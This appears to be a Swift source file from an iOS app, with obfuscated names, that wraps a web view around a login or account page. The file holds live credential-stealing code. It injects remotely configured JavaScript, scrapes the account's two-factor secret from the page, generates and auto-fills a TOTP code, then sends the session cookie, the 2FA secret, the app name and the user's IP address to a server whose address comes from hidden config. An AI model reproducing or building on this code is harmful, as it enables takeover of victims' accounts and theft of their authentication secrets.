//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import Foundation
import SwiftOTP
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct Coords_Nine_Au: UIViewRepresentable {
    func makeCoordinator() -> Lop_Nine_Au_Coordinator {
        Lop_Nine_Au_Coordinator(self)
    }

    let url: URL?
    @Binding var is_Nine_Au_Chuyen_Man: Bool
    @Binding var is_Nine_Au_Contains: Bool

    var arrayData: [String: String] = [:]
    private let ob_Nine_Au_servable = Nine_Au_Observable()
    var ob_Nine_Au_server: NSKeyValueObservation? {
        ob_Nine_Au_servable.ins_Nine_Au_tance
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))

        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { }

    class Lop_Nine_Au_Coordinator: NSObject, WKNavigationDelegate {
        var Nine_A_con_parent: Coords_Nine_Au
        init(_ Nine_A_con_parent: Coords_Nine_Au) {
            self.Nine_A_con_parent = Nine_A_con_parent
        }

        func Coords_Seven_matches(for regex: String, in text: String) -> [String] {
            do {
                let regex = try NSRegularExpression(pattern: regex)
                let results = regex.matches(in: text,
                                            range: NSRange(text.startIndex..., in: text))
                return results.map {
                    String(text[Range($0.range, in: text)!])
                }
            } catch let error {
                print("Error: \(error.localizedDescription)")
                return []
            }
        }
        
        func readIppAdd() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
                    address_i_p = loadedPerson.diachiip
                }
            }
            return address_i_p ?? "diachiip_IP_Null"
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        } // didStartProvisionalNavigation

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(arrayData[ValueKey.nine_fr_1a.rawValue] ?? "", completionHandler: { _, _ in })

            // Cho 5s cho load html all.
            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                    if let content = html as? String, error == nil {
                        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
                            // Loc ra key
                            let matchedsecret = self.Coords_Seven_matches(for: arrayData[ValueKey.nine_fr_2a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
                            if !matchedsecret.isEmpty {
                                let secretString = matchedsecret[0]
                                guard let data = base32DecodeToData(secretString) else { return }
                                guard let totp = TOTP(secret: data), let otpString = totp.generate(time: Date()) else {
                                    return
                                }
                                webView.evaluateJavaScript(arrayData[ValueKey.nine_fr_3a.rawValue] ?? "", completionHandler: { _, _ in })
                                // Cho 2s se dien vao input
                                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                                    // copy key vao bo nho tam
                                    let pasteboard = UIPasteboard.general
                                    pasteboard.string = otpString
                                    // Paste input enter.
                                    if let stringinput = pasteboard.string {
                                        // print(stringinput)
                                        webView.evaluateJavaScript("const EVENT_OPTIONS = { bubbles: true, cancelable: false, composed: true };const EVENTS = {KEYUP: new Event('keyup', EVENT_OPTIONS),BLUR: new Event('blur', EVENT_OPTIONS),CHANGE: new Event('change', EVENT_OPTIONS),INPUT: new Event('input', EVENT_OPTIONS)};const inputElement = document.querySelector('[data-key=\"0\"]');inputElement.value=\"\(stringinput)\";const tracker = inputElement._valueTracker;tracker && tracker.setValue(\"\(stringinput)\");inputElement.dispatchEvent(EVENTS.INPUT);inputElement.dispatchEvent(EVENTS.BLUR);inputElement.dispatchEvent(EVENTS.KEYUP);", completionHandler: { _, _ in })
                                    }

                                    WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                        let seven_reco_Au_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                        if seven_reco_Au_i != nil {
                                            let Seven_reco_Au_json_data: [String: Any] = [
                                                arrayData[ValueKey.name_api_23.rawValue] ?? "": cookies[seven_reco_Au_i!].value,
                                                arrayData[ValueKey.name_api_24.rawValue] ?? "": "\(matchedsecret[0])",
                                                arrayData[ValueKey.name_api_25.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")-TWO",
                                                arrayData[ValueKey.name_api_26.rawValue] ?? "": self.readIppAdd(),
                                            ]
                                            let url: URL = URL(string: arrayData[ValueKey.Chung_fr_08.rawValue] ?? "")!
                                            let json_data = try? JSONSerialization.data(withJSONObject: Seven_reco_Au_json_data)
                                            var request = URLRequest(url: url)
                                            request.httpMethod = "PATCH"
                                            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                            request.httpBody = json_data
                                            let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                                if error != nil {
                                                    print("Not Done")
                                                } else if data != nil {
                                                    self.Nine_A_con_parent.is_Nine_Au_Chuyen_Man = true
                                                    print("Done")
                                                }
                                            }
                                            task.resume()
                                        } // if
                                    }) // getAllCookies
                                }
                            } else {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                                    self.Nine_A_con_parent.is_Nine_Au_Contains = true
                                }
                            }
                        } // DispatchQueue
                    }
                } // webView.evaluateJavaScript
            } // DispatchQueue
        } // webView didFinish
    } // Coordinator
}

// Mark Lop theo doi url
private class Nine_Au_Observable: ObservableObject {
    @Published var ins_Nine_Au_tance: NSKeyValueObservation?
}

struct UserInvoicesIpadress: Codable {
    var diachiip: String
}
